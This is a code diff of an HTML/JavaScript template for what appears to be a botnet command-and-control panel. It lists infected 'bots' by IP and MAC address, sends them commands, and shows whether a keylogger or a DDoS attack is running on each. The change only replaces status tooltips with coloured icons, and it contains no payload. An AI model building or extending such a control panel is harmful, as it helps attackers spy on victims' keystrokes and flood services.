@@ -2,13 +2,6 @@
 {% set active_page = 'sessions' %}
 
 {% block body %}
-    <style>
-        .ui-tooltip {
-            white-space: pre-line;
-        }
-    </style>
-    <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css">
-    <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.js"></script>
     <div class="tw-flex tw-justify-center tw-items-start tw-py-4">
         <div class="tw-min-h-54 tw-w-80 tw-flex tw-flex-col tw-bg-card tw-rounded-xl tw-py-4">
             <div class="tw-text-center">
@@ -84,27 +77,17 @@
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.uid }}</td>
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.public_ip }}</td>
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.mac_address }}</td>
-                                {% if session.online %}
-                                    {% if session.running == 0 %}
-                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger not running&#10;DDoS attack not running">
-                                    {% elif session.running == 1 %}
-                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger running&#10;DDoS attack not running">
-                                    {% elif session.running == 2 %}
-                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger not running&#10;DDoS attack running">
-                                    {% elif session.running == 3 %}
-                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger running&#10;DDoS attack running">
-                                    {% endif %}
-                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6">
-                                            <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
-                                        </svg>
-                                    </td>
-                                {% else %}
-                                    <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Offline">
-                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6">
-                                            <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
-                                        </svg>
-                                    </td>
-                                {% endif %}
+                                <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" online="{{ session.online }}" running="{{ session.running }}">
+                                    <svg id="online-{{ session.uid }}" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6">
+                                        <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
+                                    </svg>
+                                    <svg id="keylogger-{{ session.uid }}" width="24px" height="24px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="red">
+                                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M7 14H17M6 10H6.01M10 10H10.01M14 10H14.01M18 10H18.01M5.2 18H18.8C19.9201 18 20.4802 18 20.908 17.782C21.2843 17.5903 21.5903 17.2843 21.782 16.908C22 16.4802 22 15.9201 22 14.8V9.2C22 8.0799 22 7.51984 21.782 7.09202C21.5903 6.71569 21.2843 6.40973 20.908 6.21799C20.4802 6 19.9201 6 18.8 6H5.2C4.07989 6 3.51984 6 3.09202 6.21799C2.71569 6.40973 2.40973 6.71569 2.21799 7.09202C2 7.51984 2 8.07989 2 9.2V14.8C2 15.9201 2 16.4802 2.21799 16.908C2.40973 17.2843 2.71569 17.5903 3.09202 17.782C3.51984 18 4.0799 18 5.2 18Z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g>
+                                    </svg>
+                                    <svg id="ddos-{{ session.uid }}" fill="#000000" width="24px" height="24px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" stroke-width="1.5">
+                                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title></title> <g data-name="Layer 3" id="Layer_3"> <path d="M28,21H27V7a1,1,0,0,0-1-1H6A1,1,0,0,0,5,7V21H4a1,1,0,0,0-1,1,5,5,0,0,0,5,5H24a5,5,0,0,0,5-5A1,1,0,0,0,28,21ZM7,8H25V21H7ZM24,25H8a3,3,0,0,1-2.83-2H26.83A3,3,0,0,1,24,25Z"></path> <path d="M19.21,11.29a1,1,0,0,0-1.42,0L16,13.09l-1.79-1.8a1,1,0,0,0-1.42,1.42l1.8,1.79-1.8,1.79a1,1,0,0,0,0,1.42,1,1,0,0,0,1.42,0L16,15.91l1.79,1.8a1,1,0,0,0,1.42,0,1,1,0,0,0,0-1.42l-1.8-1.79,1.8-1.79A1,1,0,0,0,19.21,11.29Z"></path> </g> </g>
+                                    </svg>
+                                </td>
                             </tr>
                         {% endfor %}
                     </tbody>
@@ -159,7 +142,6 @@
 				var session = sessions[i];
                 var uid = session.getAttribute('id').split('-')[1];
                 console.log("Sending command: '" + command + "' to session '" + uid + "'");
-
                 $.ajax({
                     url: "{{ url_for('session.session_cmd') }}", 
                     type: "POST",
@@ -168,32 +150,29 @@
                     success: function(response) {
                         i = this.ajaxI;
                         toastr.success("Bot " + i + ": " + response);
-                        $('#status-' + uid).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
                         $(document).ready(function() {
-                            var currentTitle = $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).prop("title");
-                            var newTitle;
-                            if (currentTitle === "Offline") {
-                                newTitle = "Online\nKeylogger not running\nDDoS attack not running";
-                                $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
-                            }
+                            uid = uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1");
+                            var online_icon = $('#online-' + uid);
+                            var keylogger_icon = $('#keylogger-' + uid);
+                            var ddos_icon = $('#ddos-' + uid);
+
+                            online_icon.attr('stroke', 'green');
                             if (response === "offline") {
-                                newTitle = "Offline";
-                                $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
+                                online_icon.attr('stroke', 'red');
+                                keylogger_icon.attr('stroke', 'gray');
+                                ddos_icon.attr('fill', 'gray');
                             }
                             if (response === "Keylogger started") {
-                                newTitle = currentTitle.replace("Keylogger not running", "Keylogger running");
+                                keylogger_icon.attr('stroke', 'green');
                             }
                             if (response === "Keylogger stopped" || response === "Keylogger not running") {
-                                newTitle = currentTitle.replace("Keylogger running", "Keylogger not running");
+                                keylogger_icon.attr('stroke', 'gray');
                             }
                             if (response === "DDoS attack started") {
-                                newTitle = currentTitle.replace("DDoS attack not running", "DDoS attack running");
+                                ddos_icon.attr('fill', 'green');
                             }
                             if (response === "DDoS attack stopped" || response === "DDoS attack not running") {
-                                newTitle = currentTitle.replace("DDoS attack running", "DDoS attack not running");
-                            }
-                            if (newTitle !== undefined) {
-                                $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).prop("title", newTitle);
+                                ddos_icon.attr('fill', 'gray');
                             }
                         });
                     }
@@ -244,6 +223,43 @@
             });
         });
 
+        $(document).ready(function() {
+            var sessions = $('[id^="status-"]');
+            for (var i = 0; i < sessions.length; i++) {
+                var session = sessions[i];
+                var online = session.getAttribute('online');
+                var running = session.getAttribute('running');
+                var uid = session.getAttribute('id').split('-')[1].replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1");
+                var online_icon = $('#online-' + uid);
+                var keylogger_icon = $('#keylogger-' + uid);
+                var ddos_icon = $('#ddos-' + uid);
+                if (online === 'False') {
+                    online_icon.attr('stroke', 'red');
+                    keylogger_icon.attr('stroke', 'gray');
+                    ddos_icon.attr('fill', 'gray');
+                }
+                else {
+                    online_icon.attr('stroke', 'green');
+                    if (running === '0') {
+                        keylogger_icon.attr('stroke', 'gray');
+                        ddos_icon.attr('fill', 'gray');
+                    }
+                    else if (running === '1') {
+                        keylogger_icon.attr('stroke', 'green');
+                        ddos_icon.attr('fill', 'gray');
+                    }
+                    else if (running === '2') {
+                        keylogger_icon.attr('stroke', 'gray');
+                        ddos_icon.attr('fill', 'green');
+                    }
+                    else if (running === '3') {
+                        keylogger_icon.attr('stroke', 'green');
+                        ddos_icon.attr('fill', 'green');
+                    }
+                }
+            }
+        });
+
     </script>
 
     <script>
@@ -273,14 +289,5 @@
         }
 
         pollServer();
-    </script>
-
-    <script>
-        $(document).tooltip({
-            position: {
-                my: "left center",
-                at: "right+5 center"
-            }
-        });
     </script>
 {% endblock %}
